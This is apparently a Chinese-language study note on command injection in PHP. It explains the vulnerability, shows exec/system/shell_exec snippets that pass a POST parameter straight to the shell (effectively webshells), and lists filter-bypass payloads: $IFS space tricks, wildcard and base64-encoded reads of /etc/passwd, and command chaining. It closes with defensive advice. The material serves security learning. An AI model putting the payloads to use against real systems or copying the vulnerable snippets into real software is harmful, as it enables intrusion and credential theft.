# 一、命令执行的含义
命令执行是指计算机程序或系统执行由用户输入的命令或指令的过程。

# 二、命令执行漏洞
由于应用程序在调用一些能够执行系统命令的函数（如PHP中的system）时，对于用户的输入未经过充分验证和过滤，则会导致命令执行漏洞的发生。

一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后后台会对该IP地址进行一次ping测试，并返回测试结果。如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交恶意命令，从而导致漏洞的发生。

# 三、漏洞危害
1.控制受害者的系统：攻击者可以利用漏洞控制受害者的系统，并对其进行各种恶意操作，如上传、下载、删除、修改文件等，甚至可以利用该漏洞构建僵尸网络、挖掘加密货币等。
2.窃取敏感信息：攻击者可以通过该漏洞窃取受害者系统中的敏感信息，如账号、密码、财务信息等。
3.进行后门植入：攻击者可以利用漏洞在系统中植入后门，以便在未来任何时间进行下一步的攻击。

# 四、PHP命令执行函数
## 1.exec
- 格式：`exec ( string $command [, array &$output [, int &$return_var ]] )`
- 行一个外部程序， exee(） 执行 command参数所指定的命令。
- 示例：
```
<?php
$cmd=$_POST['cmd'];
@exec($cmd, $return);
var_dump($return)
?>
```
exec()函数只会输出执行结果的最后一行
可以通过第二个参数，将结果输入到数组中，第三个参数用来取得命令执行的状态码，通常
执行成功都是返回0。

## 2.system
- 格式：`system ( string $command [, int &$return_var ] )`
- 作用：stem 函数执行给定的command命令，并将结果输出。第二个参数用于存储命令的返回状态,这是一个可选参数。
- 示例：
```
<?php  
echo '<pre>';  
  
// 输出 shell 命令 "ls" 的返回结果  
// 并且将输出的最后一样内容返回到 $last_line。  
// 将命令的返回值保存到 $retval。  
$cmd=$_POST['cmd'];  
$last_line = system($cmd, $retval);  
  
// 打印更多信息  
echo '  
</pre>  
<hr />Last line of the output: ' . $last_line . '  
<hr />Return value: ' . $retval;  
?>
```
system和exec的区别在于，system在执行系统外部命令时，直接将结果输出到浏览器，如果执行命令成功则返回true，否则返回false。第二个参数与exec第三个参数含义一样。
![[Pasted image 20250329180116.png]]

## 3.shell_exec
- 格式：`shell_exec(command)`
- 作用：shell_exec函数执行命令，并将命令的输出作为字符串返回。
- 示例：
```
<?php  
$cmd=$_POST['cmd'];  
$output = shell_exec($cmd);  
echo "<pre>$output</pre>";  
?>
```
默认不会输出命令的执行结果

# 五、命令执行中的绕过技巧
## 1.cat命令替换
要查看某个文件内容，但是cat命令被过滤了，可以尝试使用以下方式替代：
```
ca""t
ca\t
more:一页一页的显示档案内容
less：与 more 类似
head：查看头几行
tac：从最后一行开始显示，可以看出 tac是cat 的反向显示
tail：查看尾几行
nl：显示的时候，顺便输出行号
od：od指令会读取所给予的文件的内容，并将其内容以八进制字码呈现出来
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort：将文本文件内容加以 ASCII 码的次序排列
uniq：用于检查及删除文本文件中重复出现的行列
file -f：报错出具体内容
paste：把每个文件以列对列的方式，一列列地加以合并
反引号+base64编码：`echo Y2F0IC9ldGMvcGFzc3dk |base64 -d`
```

## 2.空格绕过
空格被过滤，可以尝试使用以下符号绕过：
```
<
<>
%20(即space)
%09(即tab)
$IFS$9
${IFS}
$IFS
$IFS[*]
$IFS[@]
{cat,/flag}	=cat /flag
```

## 3.文件名过滤绕过
某个文件名被过滤了，比如/etc/passwd被过滤：
```
/e?c/?asswd
/e*c/*asswd
/??c/?asswd
/??c/?assw?
```

## 4.绕过输入内容执行命令

cmd1|cmd2：无论cmd1是否执行成功，cmd2将被执行
cmd1;cmd2：无论cmd1是否执行成功，cmd2将被执行，windows不支持
cmd1||cmd2：仅在cmd1执行失败时才执行cmd2
cmd1&&cmd2：仅在cmd1执行成功后cmd2才执行
cmd1&cmd2：执行命令1和命令2 

cmd2$(cmd) ：echo $(whoami) 或者 $(touch test.sh; echo 'ls' > test.sh)
'cmd'：用于执行特定命令，如 'whoami'

# 六、漏洞防御措施
1.永远不要信任用户输入。所有输入都应该被视为不可信，必须进行适当的验证和过滤。
2.避免使用shell执行用户输入的任何部分。如果必须要执行shell命令，必须正确地过滤和转义所有输入。
3.不要将用户输入直接传递给任何外部命令或程序，而是应该使用专门的API或库，这些API或库可以帮助开发人员更安全地执行系统命令。
4.使用白名单过滤所有输入，只允许必需的字符和格式。
5.对于使用开发框架的应用程序，及时更新框架和库的版本以获得最新的安全修复。
